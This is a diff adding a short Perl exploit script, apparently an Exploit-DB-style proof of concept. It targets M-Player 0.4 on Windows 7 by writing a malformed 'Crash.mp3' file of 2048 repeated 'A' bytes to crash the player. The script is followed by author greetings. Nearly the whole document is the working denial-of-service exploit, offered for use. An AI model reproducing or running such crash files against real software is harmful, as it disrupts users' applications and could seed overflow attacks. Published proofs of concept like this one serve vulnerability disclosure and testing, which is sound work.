@@ -1,0 +1,19 @@
+#!/usr/bin/perl
+
+# Exploit Title: M-Player 0.4 Local Denial of Service Vulnerability
+# Date: 08/01/2012
+# Author: JaMbA
+# Download:
+http://www.softpedia.com/get/Multimedia/Audio/Audio-Players/M-Player.shtml
+# Version: 0.4
+# Tested on: Windows 7
+
+my $file= "Crash.mp3";
+my $junk= "\x41" x 2048;
+open($FILE,">$file");
+print $FILE $junk;
+print "\nCrash.mp3 File Created successfully\n";
+print "\ I'am From Tunisia (Ahmadso best Friend)\n";
+print "\ Dz-Devloper Work Team (wanted_29  Dr.Smt  z4k!_xy  ak27 DR.KIM
+Samoray Mr_Ghost)\n";
+close($FILE);
